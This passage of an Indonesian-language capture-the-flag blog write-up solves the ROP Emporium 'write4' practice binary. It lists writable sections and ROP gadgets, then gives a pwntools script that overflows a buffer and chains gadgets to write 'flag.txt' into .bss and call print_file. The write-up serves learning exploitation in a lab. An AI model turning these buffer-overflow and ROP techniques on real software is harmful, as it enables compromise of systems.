</code></pre></td></tr></table></div></div><p>Kita cek permisssions pada file section</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
</code></pre></td></tr></table></div></div><p>.got .got.plt .data .bss didapatkan permissions Write (W).<br>kita cari pop r14 r15 dan pop rdi</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>Gadgets information
============================================================
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400692 : pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x0000000000400693 : pop rdi ; ret
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : ret

Unique gadgets found: 15
</code></pre></td></tr></table></div></div><p>Saya memakai <em><strong>0x0000000000400690</strong></em> untuk pop 14 pop 15 dan <em><strong>0x0000000000400693</strong></em> untuk pop rdi.<br>Kita buat kode exploit</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>from pwn import *

p = ELF(&#39;./write4&#39;)
r = process(&#39;./write4&#39;)

gadgets = p.symbols[&#39;usefulGadgets&#39;]
printFlag = p.symbols[&#39;print_file&#39;]
bss = 0x000000000601038
pop_r14_r15 = 0x0000000000400690
pop_rdi = 0x0000000000400693
log.info(&#39;print_flag 0x%x&#39; %printFlag)
log.info(&#39;gadgets 0x%x&#39; %gadgets)
log.info(&#39;pop rdi 0x%x&#39; %pop_rdi)
log.info(&#39;mov r14 r15 0x%x&#39; %gadgets)
log.info(&#39;pop r14 r15 0x%x&#39; %pop_r14_r15)
log.info(&#39;bss 0x%x&#39; %bss)
junk = b&#39;X&#39;*40
payload = junk
payload += p64(pop_r14_r15)
payload += p64(bss)
payload += b&#39;flag.txt&#39;
payload += p64(gadgets)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(printFlag)
r.sendline(payload)
r.interactive()
</code></pre></td></tr></table></div></div><p>Jalankan maka didapatkan flag</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$python3 sol.py
&gt; Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Process &#39;./write4&#39; stopped with exit code -11 (SIGSEGV) (pid 13422)
[*] Got EOF while reading in interactive
$  
</code></pre></td></tr></table></div></div><p>[Created at: February 19, 2021]</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://ahm4ddm.xyz/tags/writeups/>writeups</a></li><li><a href=https://ahm4ddm.xyz/tags/linux/>linux</a></li><li><a href=https://ahm4ddm.xyz/tags/practice/>practice</a></li></ul></footer><div id=disqus_thread></div><script>(function(){var d=document,s=d.createElement('script');s.src='https://ahm4ddm-xyz.disqus.com/embed.js';s.setAttribute('data-timestamp',+new Date());(d.head||d.body).appendChild(s);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by
Disqus.</a></noscript></article></main><footer class=footer><span>&copy; 2022 <a href=https://ahm4ddm.xyz>~/.ahm4ddm</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById('menu')
if(menu){menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script></body></html>